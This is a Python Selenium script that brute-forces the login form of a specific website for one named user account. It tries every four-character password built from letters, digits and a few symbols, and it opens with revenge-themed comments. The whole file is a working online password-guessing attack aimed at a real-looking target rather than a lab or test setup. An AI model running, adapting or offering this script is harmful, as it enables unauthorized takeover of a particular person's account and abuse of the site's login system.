#chop and pray
#you sold me my own wealth
#now you gonna pay
#10 737 418 240
#the mission awaits

from selenium import webdriver
import string
driver = webdriver.Chrome() 
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
chrome_options = Options()

from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

symbols = []

upper_case_letters = string.ascii_uppercase
lower_case_letters = string.ascii_lowercase
digits = string.digits
special_characters = ['@', ".", ",", ":", "#", "_", "-"]

symbols = list(upper_case_letters + lower_case_letters + digits + ''.join(special_characters))
print(symbols)


reispass = ""

for i in range(len(symbols)):
    for k in range(len(symbols)):
        for j in range(len(symbols)):
            for q in range(len(symbols)):
                reispass = symbols[i] + symbols[k] + symbols[j] + symbols[q]

                print(reispass)
                
                driver.get("https://coffeetox.ru/form?name=login&next=%2F")
                tag = "/html/body/div[@class='global-wrapper']/div[@class='main-grid']/main[@class='styled-scroll']//form/div[@class='form-units']/div[@id='tag']/input"
                pw = "/html/body/div[@class='global-wrapper']/div[@class='main-grid']/main[@class='styled-scroll']/form/div[@class='form-units']/div[@id='pw']/input"
                buttonq = "/html/body/div[@class='global-wrapper']/div[@class='main-grid']/main[@class='styled-scroll']/form/input[@class='button']"

                # Ожидание появления элемента для ввода Name
                name_input = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, "/html/body/div[@class='global-wrapper']/div[@class='main-grid']/main[@class='styled-scroll']//form/div[@class='form-units']/div[@id='tag']/input")))
                name_input.send_keys("fedoss")

                # Ожидание появления элемента для ввода Password
                pw_input = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, "/html/body/div[@class='global-wrapper']/div[@class='main-grid']/main[@class='styled-scroll']/form/div[@class='form-units']/div[@id='pw']/input")))
                pw_input.send_keys(reispass)

                # Ожидание появления кнопки Submit
                submit_button = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, "/html/body/div[@class='global-wrapper']/div[@class='main-grid']/main[@class='styled-scroll']/form/input[@class='button']")))
                submit_button.click()

print("Ze Konets")